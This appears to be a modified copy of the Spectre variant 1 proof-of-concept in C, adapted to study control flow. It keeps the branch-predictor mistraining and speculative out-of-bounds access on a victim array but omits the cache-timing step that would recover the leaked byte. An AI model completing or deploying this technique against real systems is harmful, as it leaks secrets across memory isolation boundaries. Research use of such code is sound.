/* Modified for Control Flow Purposes*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "P";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void spectre_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
/* Report best guess in value[0] and runner-up in value[1] */
/*kdebug_signpost();*/
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
 /* int tries, i, j, k, mix_i, junk = 0; */
  int tries, i, j;
  size_t training_x, x;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 1500; tries > 0; tries--) {
/*kdebug_signpost();*/

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      spectre_function(x);

    }
  }
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = strlen(secret);
  uint8_t value[2];
  int test_success = 0;

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  while (--len >= 0) {
    printf("Attempting Confirmation %p ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
  }

  return test_success;
}
